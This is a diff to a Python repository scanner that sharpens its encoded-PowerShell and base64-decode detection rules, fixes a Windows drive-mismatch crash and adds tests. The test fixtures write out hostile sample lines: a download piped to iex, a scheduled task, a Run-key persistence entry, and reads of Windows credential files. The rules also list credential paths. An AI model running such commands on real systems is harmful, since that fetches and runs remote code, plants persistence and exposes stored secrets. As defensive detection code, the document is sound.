@@ -24,8 +24,8 @@ RULES = [
      r"(?i:\b(iwr|irm|invoke-webrequest|invoke-restmethod)\b[^\n|]*\|\s*(iex|invoke-expression)\b"
      r"|\b(iex|invoke-expression)\b[^\n]*\.download(string|data)\()"),
     ("encoded-powershell", "HIGH", "runs base64-encoded PowerShell you can't read",
-     # PowerShell takes any prefix of -EncodedCommand, `/` for `-`, and en/em dashes; -Ex... is ExecutionPolicy.
-     r"(?i:\b(powershell|pwsh)(\.exe)?\b[^\n]*\s[-/\u2013\u2014]e(?!x)[a-z]*\s)"),
+     # PowerShell takes any prefix of -EncodedCommand, `/` for `-`, and en/em dashes; -Ex.../-ep is ExecutionPolicy.
+     r"(?i:\b(powershell|pwsh)(\.exe)?\b[^\n]*\s[-/\u2013\u2014]e(?!x|p\s)[a-z]*\s)"),
     ("shell-profile", "HIGH", "edits shell startup files (persistence, PATH hijack)",
      r"\.(zshrc|bashrc|bash_profile|zprofile|zshenv)\b|(?i:powershell_profile\.ps1|\$profile\b)"),
     ("windows-persistence", "HIGH", "installs something that survives reboot on Windows",
@@ -39,7 +39,7 @@ RULES = [
      r"\.ssh[/\\]|\.aws[/\\]credentials|\.kube[/\\]config|\.docker[/\\]config\.json|Keychains|\.netrc|\.npmrc"
      r"|(?i:[/\\]microsoft[/\\](credentials|protect)[/\\]|\blogin data\b)"),
     ("decode-exec", "MEDIUM", "decodes hidden data (common obfuscation)",
-     r"base64\s+(-d|--decode)|b64decode\(|atob\(|Buffer\.from\([^)]*base64|fromhex\("),
+     r"base64\s+(-d|--decode)|b64decode\(|atob\(|Buffer\.from\([^)]*base64|fromhex\(|(?i:frombase64string\()"),
     ("dynamic-exec", "MEDIUM", "runs code built at runtime",
      r"\b(exec|eval)\s*\(\s*(compile|.*decode|.*decompress|.*join)"),
     ("long-blob", "MEDIUM", "long encoded blob hidden in source",
@@ -204,8 +204,11 @@ def resolve_docker(target):
         return None
     exe = os.path.realpath(exe)
     for unsafe in (os.path.realpath(target), os.path.realpath(os.getcwd())):
-        if os.path.commonpath([exe, unsafe]) == unsafe:
-            return None
+        try:
+            if os.path.commonpath([exe, unsafe]) == unsafe:
+                return None
+        except ValueError:  # different Windows drives: docker can't be inside it
+            pass
     return exe
 
 
@@ -246,7 +249,8 @@ def test():
             "clean.py": "print('hello world')\n",
             "setup.ps1": "iwr https://x.example/a.ps1 | iex\nschtasks /create /tn x /tr evil.exe\n",
             "run.bat": "powershell -enc SQBFAFgA\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x\n",
-            "enc2.ps1": "pwsh /EncodedC SQBFAFgA\nPowerShell -ExecutionPolicy Bypass -File ok.ps1\n",
+            "enc2.ps1": "pwsh /EncodedC SQBFAFgA\nPowerShell -ExecutionPolicy Bypass -File ok.ps1\npowershell -ep bypass -File ok.ps1\n",
+            "b64.ps1": "$p = [Convert]::FromBase64String($blob)\n",
             "fwd.ps1": "New-ItemProperty HKCU:/Software/Microsoft/Windows/CurrentVersion/Run -Name x\n",
             "loot.ps1": "gc $env:APPDATA\\Microsoft\\Credentials\\x\nAdd-Content $PROFILE 'evil'\n",
             "tool": "\x7fELF rest",
@@ -274,12 +278,13 @@ def test():
                          ("ps-download-exec", "setup.ps1"), ("windows-persistence", "setup.ps1"),
                          ("encoded-powershell", "run.bat"), ("windows-persistence", "run.bat"),
                          ("credential-path", "loot.ps1"), ("shell-profile", "loot.ps1"),
-                         ("encoded-powershell", "enc2.ps1"), ("windows-persistence", "fwd.ps1")]:
+                         ("encoded-powershell", "enc2.ps1"), ("windows-persistence", "fwd.ps1"),
+                         ("decode-exec", "b64.ps1")]:
             assert expected in ids, (expected, ids)
         assert not any(where == "clean.py" for _, where in ids), ids
         assert not any(rid == "npm-install-hook" and "jest" in why for _, rid, _, why in scan(d))
         enc = [f[2] for f in scan(d) if f[1] == "encoded-powershell"]
-        assert "enc2.ps1:2" not in enc and "enc2.ps1:1" in enc, enc  # -ExecutionPolicy isn't -EncodedCommand
+        assert [e for e in enc if e.startswith("enc2")] == ["enc2.ps1:1"], enc  # -ExecutionPolicy / -ep aren't -EncodedCommand
         planted = os.path.join(d, "docker.exe" if os.name == "nt" else "docker")
         with open(planted, "w") as f:
             f.write("#!/bin/sh\n")
@@ -296,6 +301,8 @@ def test():
         assert flag in " ".join(argv), flag
     assert argv[-1].endswith("exec make test") and f"{os.path.abspath('x')}:/src:ro" in argv
     assert path_ok("x")
+    if os.name == "nt":  # repo and docker on different drives must not crash commonpath
+        assert resolve_docker(r"Z:\nowhere") is None or os.path.isabs(resolve_docker(r"Z:\nowhere"))
     if os.name == "nt":  # the old bug: every Windows path has a drive-letter colon
         assert path_ok(r"C:\Users\me\repo")
     else:  # ':' can't appear in Windows file names, so only POSIX can hit this
